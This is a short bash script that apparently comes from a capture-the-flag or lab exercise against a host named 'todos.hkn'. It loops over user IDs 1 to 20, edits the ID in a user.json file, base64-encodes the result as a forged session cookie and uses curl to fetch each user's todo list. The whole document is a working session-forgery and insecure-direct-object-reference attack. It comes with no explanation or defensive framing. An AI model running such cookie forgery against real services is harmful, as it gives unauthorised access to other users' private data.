```bash
#!/bin/bash

for n in $(seq 1 20); do
	echo $n
	cookie=$(cat user.json | sed "s/\"1\"/\"$n\"/g" -- | base64 | tr -d '\n')
	curl --cookie "session=$cookie" todos.hkn/todos
done
```
